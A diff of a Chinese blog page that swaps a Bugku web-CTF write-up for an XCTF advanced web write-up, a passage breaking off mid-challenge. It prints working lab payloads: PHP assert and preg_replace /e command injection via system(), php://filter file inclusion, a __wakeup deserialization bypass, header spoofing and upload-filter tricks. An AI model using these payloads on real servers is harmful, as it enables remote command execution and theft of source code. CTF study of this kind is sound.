@@ -22,7 +22,7 @@
     <meta name="description" content="Saying and doing are two different things.">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Bugku—web题总结(三) · Lemon&#39;s blog</title>
+    <title>XCTF(攻防世界)—进阶web题Write Up(二) · Lemon&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Lemon&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Bugku—web题总结(三)</a>
+                <a href="#" class="post-name">XCTF(攻防世界)—进阶web题Write Up(二)</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Bugku—web题总结(三)
+            XCTF(攻防世界)—进阶web题Write Up(二)
             <!-- 404 -->
             
         </h1>
@@ -274,12 +274,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">701</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/09/02</span>
+                    <span class="post-intro-time">2019/09/05</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -403,31 +403,82 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p><strong>前言：继续总结，学习知识！！！</strong></p>
-<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a><strong>你从哪里来</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901163735214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示，可以知道这道题应该是构造<code>referer</code>——伪造来源浏览器，抓包进行伪造</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https:<span class="comment">//www.google.com</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190901163921196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a><strong>程序员本地网站</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901164415438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示，这道题考察的是<code>xff</code>——伪造IP地址来源，抓包修改成本地IP地址即可</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190901164535178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a><strong>md5 collision(NUPT_CTF)</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901191827873.png" alt="在这里插入图片描述"><br>简单的MD5碰撞，由<code>==</code>的用法，<code>0 == 字符串</code>是成立的，从而可以绕过MD5检查。之前了解过MD5算法的漏洞，会将<code>0e</code>开头的当作<code>0</code>，所以只要找到常见的一个以<code>oe</code>开头加密过的MD5值即可</p>
-<p>举个例子：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">"Hello"</span>; </span><br><span class="line"><span class="keyword">echo</span> md5($str); </span><br><span class="line"><span class="keyword">if</span> (md5($str) == <span class="string">"8b1a9953c4611296a827abf8c47804d7"</span>) </span><br><span class="line"><span class="comment">//0 == 字符串</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;Hello world!"</span>; </span><br><span class="line"><span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>理解了这些，就构造payload：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=s155964671a</span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190901192501914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a><strong>never give up</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901193404785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这道题一开始困住很长时间，看了源代码提示后进入这个页面<br><img src="http://img-blog.csdnimg.cn/20190901193503506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>便毫无思路了，后来才发现在源代码中查看<code>1p.html</code>才有相应的提示。。。<br><img src="http://img-blog.csdnimg.cn/2019090119371735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现一串base64编码，进行解码<br><img src="http://img-blog.csdnimg.cn/20190901193842866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>明显是URL编码，继续解码<br><img src="http://img-blog.csdnimg.cn/20190901194015688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有<code>require()</code> 函数引入<code>f4l2a3g.txt</code>文件，直接查看即可得出flag<br><img src="https://img-blog.csdnimg.cn/20190901194048443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a><strong>web4</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901195432563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看源代码发现<br><img src="https://img-blog.csdnimg.cn/20190901195608541.png" alt="在这里插入图片描述"><br>URL编码的，解码<br><img src="https://img-blog.csdnimg.cn/20190901195630481.png" alt="在这里插入图片描述"><br>unescape() 函数可对通过 escape() 编码的字符串进行解码。</p>
-<p>接下来根据<code>eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));</code>顺序进行拼接即可</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">67</span>d709b2b54aa2aa648cf6e87a7114f1</span><br></pre></td></tr></table></figure>
-<p>得出flag<br><img src="http://img-blog.csdnimg.cn/20190901200025664.png" alt="在这里插入图片描述"></p>
-<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a><strong>管理员系统</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901201344797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目是管理员系统，猜测用户名应该是<code>admin</code>，查看源代码发现<br><img src="http://img-blog.csdnimg.cn/20190901201440816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码后得到<code>test123</code>，应该是密码，但是输入之后发现<br><img src="http://img-blog.csdnimg.cn/20190901201515942.png" alt="在这里插入图片描述"><br>所以抓包XFF伪造IP地址即可得出flag<br><img src="http://img-blog.csdnimg.cn/2019090120161970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a><strong>login1(SKCTF)</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190901203120857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示是SQL约束攻击，了解一下SQL约束攻击<br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">基于约束的SQL攻击 </a><br>具体的就不详细解释了，大师傅已经在博客中说的很清楚了。<br><img src="http://img-blog.csdnimg.cn/2019090120350561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注册一个普通账号，会提示<code>不是管理员还想登进去</code>，那就注册一个admin账号，但是已经存在了，这时就用道了SQL约束攻击</p>
-<p>构造用户名<br><img src="http://img-blog.csdnimg.cn/20190901203641846.png" alt="在这里插入图片描述"><br>后面多加空格，密码按照要求即可</p>
-<p>注册成功后，输入<code>admin</code>和注册时的密码即可<br><img src="http://img-blog.csdnimg.cn/20190901203738260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>原理的话就是大师傅的这一段话，如果不太了解可以仔细看大师傅的博客<br><img src="https://img-blog.csdnimg.cn/20190901204000698.png" alt="在这里插入图片描述"></p>
-<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a><strong>求getshell</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190902200804394.png" alt="在这里插入图片描述"><br> 根据提示，只能上传图片，抓包<br> <img src="http://img-blog.csdnimg.cn/20190902200856156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 将后缀名改为php发现上传不成功，之后尝试各种方法如：<code>后缀名加::$DATA绕过</code>，尝试了<code>phtml，php3，php4, php5, pht</code>发现还是不行，最后看了大师傅们的博客<br> <img src="http://img-blog.csdnimg.cn/20190902201210270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>这个地方需要大小写搭配上</code>php5`才能绕过，是真的想不到，之前也没遇到过。</p>
-<p>发包即可得出flag</p>
-<p><strong>这次就先总结到这里！</strong></p>
+        <p><strong>前言：继续总结学到的新知识</strong></p>
+<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190903205336833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在about页面发现，搭建网站时用了<code>git</code>,尝试一下是否为<code>git源码泄露</code><br><img src="http://img-blog.csdnimg.cn/20190903205439478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.198.29.45:36544/.git/</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img-blog.csdnimg.cn/2019090320561415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>果然是源码泄露，那就查看一下文件，发现并没有找到flag，在Github上下载<code>git源码泄露工具</code>，可以得到其源码。</p>
+<p>输入相应的命令：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://<span class="number">111.198</span><span class="number">.29</span><span class="number">.45</span>:<span class="number">36544</span>/.git/</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/2019090320590186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到源码，发现并没有flag<br><img src="http://img-blog.csdnimg.cn/20190903205953550.png" alt="在这里插入图片描述"><br>查看index.php发现<br><img src="http://img-blog.csdnimg.cn/20190903210207220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并没有对<code>GET</code>进去的参数进行过滤，<code>assert</code>函数中参数为表达式可以当作<code>PHP</code>文件来执行，再了解一下以下这两个函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strpos() 函数查找字符串在另一字符串中第一次出现的位置。</span><br><span class="line">file_exists() 函数检查文件或目录是否存在</span><br></pre></td></tr></table></figure>
+<p>有了<code>assert</code>函数，又没有过滤，可以用<code>system()</code>函数进行查看文件等</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=flag '.system("ls").'</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190903210838436.png" alt="在这里插入图片描述"><br>查看<code>templates</code> </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=flag '.system("cd templates;ls").'</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/2019090321110335.png" alt="在这里插入图片描述"><br>最后查看<code>flag.php</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=flag '.system("cat templates/flag.php").'</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190903211216840.png" alt="在这里插入图片描述"><br>在源码中即可发现flag</p>
+<p>注意：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">""</span>) 中命令使用双引号</span><br></pre></td></tr></table></figure>
+<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a><strong>NaNNaNNaNNaN-Batman</strong></h2><p>下载附件，打开文件发现乱码<br><img src="http://img-blog.csdnimg.cn/20190904195459711.png" alt="在这里插入图片描述"><br>不过还是能看到<code>&lt;script&gt;</code>等标签的，后缀名改为<code>html</code><br><img src="http://img-blog.csdnimg.cn/20190904195559484.png" alt="在这里插入图片描述"><br>观察了还是没有什么头绪，继续看文件源代码<br><img src="http://img-blog.csdnimg.cn/20190904195710444.png" alt="在这里插入图片描述"><br>发现在文件最后有一个<code>eval()</code>函数，改成可以弹窗的<code>alert()</code>函数将脚本文件通过弹窗显示出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190904195954946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整理好<br><img src="http://img-blog.csdnimg.cn/20190904200121735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察源码，只要满足代码中的正则表达式即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^ 	匹配输入字符串的开始位置</span><br><span class="line">$ 	匹配输入字符串的结尾位置</span><br></pre></td></tr></table></figure>
+<p>又限制了e的长度，<code>^</code>和<code>$</code>必须匹配到，所以可以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e=be0f23233ace98aa</span><br></pre></td></tr></table></figure>
+<p>还有一种方法利用控制台直接执行下面的代码<br><img src="http://img-blog.csdnimg.cn/20190904200528952.png" alt="在这里插入图片描述"><br>即可得出flag</p>
+<h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a><strong>PHP2</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190904203240878.png" alt="在这里插入图片描述"><br>什么也没有，抓包，御剑扫<br><img src="http://img-blog.csdnimg.cn/20190904203306254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现<code>index.php</code>，但是打开还是这个页面，那就试一下<code>index.phps</code>，发现有源码泄露<br><img src="http://img-blog.csdnimg.cn/2019090420342634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里解释一下<code>.phps</code>文件</p>
+<blockquote>
+<p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。</p>
+</blockquote>
+<p>接下来分析源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">===是恒等计算符   同时检查表达式的值与类型</span><br><span class="line">==是比较运算符号  不会检查条件式的表达式的类型</span><br></pre></td></tr></table></figure>
+<p>第一步需要使这行代码不成立</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;admin&quot;===$_GET[id])</span><br></pre></td></tr></table></figure>
+<p>第二步需满足这行代码成立<br><code>$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)</code></p>
+<p>由于网站在解析输入的参数时会对非ASCII码的字符进行一次<code>urlencode</code></p>
+<p>所以构造payload时将其中一个字符<code>urlencode</code>两次即可<br><strong>payload:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.198.29.45:40639/index.php?id=a%2564min</span></span><br></pre></td></tr></table></figure>
+<p>即可得出flag</p>
+<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a><strong>unserialize3</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190905180529614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个格式再加上题目，很容易就可以想到是考察<code>反序列化的</code></p>
+<p>PHP魔法函数中存在<code>__wakeup()</code>方法，<code>unserialize()</code>会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法。</p>
+<p>下面就来构造payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br><span class="line"><span class="meta">#xctf后面的1即代表属性个数</span></span><br></pre></td></tr></table></figure>
+<p>发现回显结果为：</p>
+<p><strong>bad requests</strong></p>
+<p>这里是因为<code>__wakeup()</code>的影响，所以要绕过<code>__wakeup</code>,</p>
+<pre><code>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)
+</code></pre><p>故构造payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>即可得出flag</p>
+<p><strong>补充：属性</strong></p>
+<blockquote>
+<p>类的变量成员叫做“属性”，或者叫“字段”、“特征”，在本文档统一称为“属性”。属性声明是由关键字 public，protected 或者 private 开头，然后跟一个普通的变量声明来组成。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确的属性声明</span></span><br><span class="line">   <span class="keyword">public</span> $var6 = myConstant;</span><br></pre></td></tr></table></figure>
+<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a><strong>ics-05</strong></h2><p><img src="http://img-blog.csdnimg.cn/20190905194103640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>御剑、源码都没有什么线索，点击一下<code>云平台设备维护中心</code>，发现URL有变化<br><img src="http://img-blog.csdnimg.cn/20190905194201277.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFI漏洞的黑盒判断方法：</span><br><span class="line">单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</span><br></pre></td></tr></table></figure>
+<p>所以猜测是应该是<code>文件包含读源码</code>，利用<code>php://filter</code>协议即可</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190905194504946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到<code>index.php</code>源码，在源码中发现关键的代码<br><img src="http://img-blog.csdnimg.cn/20190905194556755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] 获取IP地址</span><br><span class="line">preg_replace($pattern, $replacement, $subject)</span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换</span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组</span><br></pre></td></tr></table></figure>
+<p>这串代码存在一个漏洞，<code>preg_replace</code>函数存在命令执行漏洞<br><code>preg_replace()</code>函数使用 <code>/e</code>模式，导致代码执行的问题</p>
+<blockquote>
+<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
+</blockquote>
+<p>所以利用这个漏洞可以执行一些命令</p>
+<p>抓包，首先设置<code>IP</code>地址为<code>127.0.01</code>，再传入三个参数的值</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/<span class="number">1234</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=<span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190905195338695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现一个特别的文件夹<code>s3chahahaDir</code>，进行查看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/<span class="number">1234</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=<span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p>在这里用空格会没有变化，用<code>%20</code>或者<code>+</code>代替，<code>%26%26</code>为<code>&amp;&amp;</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&amp;&amp;B   A执行成功，然后才会执行B</span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190905195813941.png" alt="在这里插入图片描述"><br>发现<code>flag</code>文件，进行查看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/<span class="number">1234</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=<span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20190905195927638.png" alt="在这里插入图片描述"><br>使用<code>cat</code>命令查看<code>flag.php</code></p>
